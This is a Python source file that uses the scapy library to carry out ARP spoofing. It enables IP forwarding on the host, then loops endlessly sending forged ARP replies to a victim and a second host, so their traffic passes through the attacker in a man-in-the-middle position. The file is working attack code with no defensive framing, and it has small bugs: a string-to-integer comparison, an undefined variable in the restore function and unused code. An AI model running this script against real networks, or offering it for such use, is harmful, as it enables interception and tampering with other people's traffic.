import os
import time
from scapy.all import *

class Arp:

	def enable_iproute(self):
		print("Enabling IP Routing...")
		file_path = "/proc/sys/net/ipv4/ip_forward"
		with open(file_path) as f:
			if f.read() == 1:
				print("IP Routing already enabled.")
				return
		with open(file_path, "w") as f:
			f.write("1")
		print("IP Routing Enabled.")


	def get_mac(self, target_ip):
		ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=3, verbose=0)
		if ans:
			return ans[0][1].src


	def arp_spoof(self, victim_ip, spoof_ip, interface):
		victim_mac = getmacbyip(victim_ip)
		spoof_mac = getmacbyip(spoof_ip)
		arp_response = Ether(src=get_if_hwaddr(interface))/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
		sendp(arp_response, iface=interface, verbose=0)


	def arp_restore(self, victim_ip, spoof_ip):
		victim_mac = getmacbyip(victim_ip)
		spoof_mac = getmacbyip(spoof_ip)
		arp_response = Ether(src=get_if_hwaddr(interface))/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
		sendp(arp_response, iface=interface, verbose=0, count=10)


	def arp(self, victim_ip, spoof_ip, interface):

		self.enable_iproute()

		queue_number = 1

		while True:
			self.arp_spoof(spoof_ip, victim_ip, interface)
			self.arp_spoof(victim_ip, spoof_ip, interface)
			
			time.sleep(1)
